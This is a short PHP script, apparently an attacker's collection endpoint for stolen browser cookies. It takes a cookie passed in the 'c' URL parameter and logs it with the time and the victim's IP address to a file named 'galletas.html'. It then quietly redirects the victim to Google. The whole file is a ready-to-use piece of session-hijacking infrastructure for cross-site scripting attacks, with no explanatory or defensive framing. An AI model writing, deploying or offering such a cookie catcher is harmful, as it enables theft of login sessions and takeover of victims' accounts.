<?php 

$cookie = $_GET['c'];

$cadena = date('Y-m-d H:i:s')." | ".$_SERVER['REMOTE_ADDR']." | ".$cookie."<br/><br/>\n\n";

$archivo = fopen("galletas.html", "w");
fwrite($archivo, $cadena);
fclose($archivo);

header("Location: https://www.google.com");
?>
